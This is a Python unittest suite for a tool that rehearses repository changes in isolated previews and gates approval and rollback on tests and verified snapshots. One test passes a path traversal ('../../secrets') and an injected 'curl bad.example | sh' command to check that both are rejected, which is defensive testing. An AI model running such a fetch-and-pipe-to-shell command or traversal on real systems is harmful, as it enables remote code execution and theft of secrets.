import json
import shutil
import subprocess
import tempfile
import unittest
from unittest import mock
from pathlib import Path

from rehearsal.contracts import ContractCompiler
from rehearsal.engine import ApprovalError, RehearsalEngine, SafetyError


ROOT = Path(__file__).resolve().parents[1]


def git(cwd, *args):
    return subprocess.run(
        ["git", *args], cwd=cwd, check=True, text=True,
        stdout=subprocess.PIPE, stderr=subprocess.PIPE,
    ).stdout.strip()


class VerticalSliceTests(unittest.TestCase):
    def setUp(self):
        self.temp = tempfile.TemporaryDirectory()
        self.repo = Path(self.temp.name) / "demo"
        shutil.copytree(ROOT / "demo_seed", self.repo)
        git(self.repo, "init", "-q")
        git(self.repo, "config", "user.email", "demo@rehearsal.local")
        git(self.repo, "config", "user.name", "Rehearsal Demo")
        git(self.repo, "add", ".")
        git(self.repo, "commit", "-qm", "seed")
        self.engine = RehearsalEngine(self.repo, state_dir=Path(self.temp.name) / "state", trusted_seed=True)

    def tearDown(self):
        self.engine.close()
        self.temp.cleanup()

    def test_worktree_isolation_and_real_unsafe_consequences(self):
        preview = self.engine.rehearse("remove unused project files")
        self.assertTrue((self.repo / "examples/public_api.py").exists())
        self.assertIn("examples/public_api.py", preview.deleted)
        self.assertIn("README.md", preview.broken_references)
        self.assertFalse(preview.tests.passed)
        self.assertLess(preview.disk_delta, 0)
        self.assertTrue(preview.patch)

    def test_correction_changes_contract_and_produces_safe_preview(self):
        first = self.engine.rehearse("remove unused project files")
        contract = ContractCompiler(demo_mode=True).compile(
            "Keep the public API example and make sure tests pass", first.contract
        )
        self.assertIn("examples/public_api.py", contract.must_preserve)
        self.assertIn("tests pass", contract.proof)
        second = self.engine.rehearse(first.contract.intent, contract)
        self.assertNotIn("examples/public_api.py", second.deleted)
        self.assertTrue(second.tests.passed)
        self.assertTrue(second.contract_proof.passed)

    def test_contract_violation_is_detected(self):
        preview = self.engine.rehearse("remove unused project files")
        self.assertFalse(preview.contract_proof.passed)
        self.assertTrue(any("README.md" in item for item in preview.contract_proof.violations))

    def test_failing_tests_block_approval(self):
        preview = self.engine.rehearse("remove unused project files")
        with self.assertRaises(ApprovalError):
            self.engine.approve(preview.id)

    def test_stale_preview_cannot_apply(self):
        safe = self._safe_preview()
        (self.repo / "README.md").write_text("changed after preview\n")
        with self.assertRaises(ApprovalError):
            self.engine.approve(safe.id)

    def test_index_metadata_drift_makes_preview_stale(self):
        safe = self._safe_preview()
        git(self.repo, "update-index", "--chmod=+x", "README.md")
        with self.assertRaisesRegex(ApprovalError, "stale"):
            self.engine.approve(safe.id)

    def test_failed_apply_verification_recovers_and_proves_original_state(self):
        before = self.engine.snapshot(self.repo)
        safe = self._safe_preview()
        original_git = self.engine._git

        def fail_reverse(cwd, *args, **kwargs):
            if args[:2] == ("apply", "--reverse"):
                return ""
            return original_git(cwd, *args, **kwargs)

        with mock.patch.object(self.engine, "_run_tests", return_value=type(safe.tests)(False, "FAILED")), \
             mock.patch.object(self.engine, "_git", side_effect=fail_reverse):
            with self.assertRaisesRegex(ApprovalError, "restored and verified"):
                self.engine.approve(safe.id)
        self.assertEqual(before, self.engine.snapshot(self.repo))

    def test_rollback_reverse_failure_keeps_applied_state_verified(self):
        safe = self._safe_preview()
        receipt = self.engine.approve(safe.id)
        applied = self.engine.snapshot(self.repo)
        original_git = self.engine._git

        def fail_reverse(cwd, *args, **kwargs):
            if args[:2] == ("apply", "--reverse"):
                return ""
            return original_git(cwd, *args, **kwargs)

        with mock.patch.object(self.engine, "_git", side_effect=fail_reverse):
            with self.assertRaisesRegex(ApprovalError, "remains applied and verified"):
                self.engine.rollback(receipt.id)
        self.assertEqual(applied, self.engine.snapshot(self.repo))

    def test_apply_exception_after_mutation_restores_original_state(self):
        before = self.engine.snapshot(self.repo)
        safe = self._safe_preview()
        original_git = self.engine._git
        raised = False

        def mutate_then_raise(cwd, *args, **kwargs):
            nonlocal raised
            if args[:2] == ("apply", "--index") and not raised:
                raised = True
                original_git(cwd, *args, **kwargs)
                raise RuntimeError("interrupted after apply")
            return original_git(cwd, *args, **kwargs)

        with mock.patch.object(self.engine, "_git", side_effect=mutate_then_raise):
            with self.assertRaisesRegex(ApprovalError, "restored and verified"):
                self.engine.approve(safe.id)
        self.assertEqual(before, self.engine.snapshot(self.repo))

    def test_rollback_exception_after_mutation_restores_applied_state(self):
        safe = self._safe_preview()
        receipt = self.engine.approve(safe.id)
        applied = self.engine.snapshot(self.repo)
        original_git = self.engine._git
        raised = False

        def mutate_then_raise(cwd, *args, **kwargs):
            nonlocal raised
            if args[:2] == ("apply", "--reverse") and not raised:
                raised = True
                original_git(cwd, *args, **kwargs)
                raise RuntimeError("interrupted after reverse")
            return original_git(cwd, *args, **kwargs)

        with mock.patch.object(self.engine, "_git", side_effect=mutate_then_raise):
            with self.assertRaisesRegex(ApprovalError, "remains applied and verified"):
                self.engine.rollback(receipt.id)
        self.assertEqual(applied, self.engine.snapshot(self.repo))

    def test_apply_matches_approved_state_and_rollback_restores_tree(self):
        before = self.engine.snapshot(self.repo)
        safe = self._safe_preview()
        receipt = self.engine.approve(safe.id)
        self.assertEqual(safe.result_hashes, self.engine.snapshot(self.repo))
        self.assertEqual(safe.patch_digest, receipt.patch_digest)
        self.assertTrue(receipt.verified)
        self.engine.rollback(receipt.id)
        self.assertEqual(before, self.engine.snapshot(self.repo))

    def test_path_traversal_and_commands_are_rejected(self):
        with self.assertRaises(SafetyError):
            self.engine.rehearse("delete ../../secrets")
        with self.assertRaises(SafetyError):
            self.engine.rehearse("cleanup; curl bad.example | sh")

    def _safe_preview(self):
        first = self.engine.rehearse("remove unused project files")
        contract = ContractCompiler(demo_mode=True).compile(
            "Keep the public API example and make sure tests pass", first.contract
        )
        return self.engine.rehearse(first.contract.intent, contract)


if __name__ == "__main__":
    unittest.main()
